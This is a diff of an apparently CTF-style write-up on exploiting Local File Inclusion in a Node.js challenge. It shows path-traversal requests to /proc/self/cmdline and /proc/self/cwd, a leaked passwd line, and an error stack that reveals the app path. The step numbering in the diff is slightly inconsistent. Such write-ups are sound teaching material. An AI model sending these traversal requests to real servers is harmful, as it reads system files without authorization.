@@ -48,33 +48,29 @@ My first instinct is to test for Local File Inclusion (LFI). I tried a classic p
 ```
 node:x:1000:1000::/home/node:/bin/sh
 ```
-This confirms:
-- Backend runs as `node`
-- Application is likely **Node.js**
-
 ---
 
-## Step 3 — procfs Enumeration
+## Step 2: Process Information Leakage
 
-Using LFI on `/proc/self/cmdline`:
+Linux's `/proc` filesystem is a goldmine for attackers. I tried accessing process information:
+```
+GET /../../../proc/self/cwd HTTP/1.1
+```
+![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/33.PNG)
 
 ```http
 GET /../../../proc/self/cmdline HTTP/1.1
 Host: target
 ```
-
-Response:
-
+The error message was more valuable than success:
 ```
-node nodeserver.js
+Error: EISDIR: illegal operation on a directory, read
+at /app/server.js:114:28
 ```
-
-This shows the app was started as:
-
-```
-node nodeserver.js
-```
-
+**Key Intelligence Gathered:**
+ - Application path: `/app`
+ - Main file: `server.js`
+ 
 ---
 
 ## Step 4 — Application Path Leak
